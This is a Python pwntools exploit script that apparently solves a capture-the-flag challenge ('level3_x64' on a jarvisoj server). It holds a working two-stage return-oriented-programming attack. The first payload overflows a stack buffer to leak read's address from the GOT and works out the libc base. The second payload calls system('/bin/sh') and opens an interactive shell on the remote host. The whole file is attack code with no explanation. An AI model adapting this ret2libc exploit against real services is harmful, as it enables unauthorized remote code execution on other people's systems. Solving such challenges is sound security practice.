from pwn import *

context.os='linux'
context.arch='x86-64'
context.log_level='debug'

r=remote('pwn2.jarvisoj.com',9883)
elf=ELF('level3_x64')
libc=ELF('libc-2.19.so')

########ROPgadget########
pop_rdi_ret	=0x4006b3
pop_rsi_r15_ret	=0x4006b1
binsh_in_libc	=0x17c8c3
####GOT&PLT&SYMs&LIBC####
plt_write=elf.plt['write']
got_read=elf.got['read']
sym_vuln=elf.symbols['vulnerable_function']
libc_syst=libc.symbols['system']
libc_exit=libc.symbols['exit']
libc_read=libc.symbols['read']
#########################

########PAYLOAD1#########
payload1=0x80*'A'+0x8*'B'
payload1+=p64(pop_rdi_ret)
payload1+=p64(0x01)
payload1+=p64(pop_rsi_r15_ret)
payload1+=p64(got_read)
payload1+=p64(0xdeadbeef)#r15 has no use
payload1+=p64(plt_write)
payload1+=p64(sym_vuln) 

########FirstStep########
r.recvuntil(':\n')
r.send(payload1)
reply1=r.recv(8)
rel_read=u64(reply1[0:8])
print hex(rel_read)

########CALCULATE########
offset=rel_read-libc_read
rel_binsh=offset+binsh_in_libc
rel_syst=offset+libc_syst
rel_exit=offset+libc_exit

########PAYLOAD2#########
payload2=0x80*'A'+0x8*'B'
payload2+=p64(pop_rdi_ret)
payload2+=p64(rel_binsh)
payload2+=p64(rel_syst)
payload2+=p64(pop_rsi_r15_ret)
payload2+=p64(0x0)
payload2+=p64(0xdeadbeef)#r15 has no use
payload2+=p64(rel_exit)

#######SecondStep########
r.send(payload2)
r.interactive()
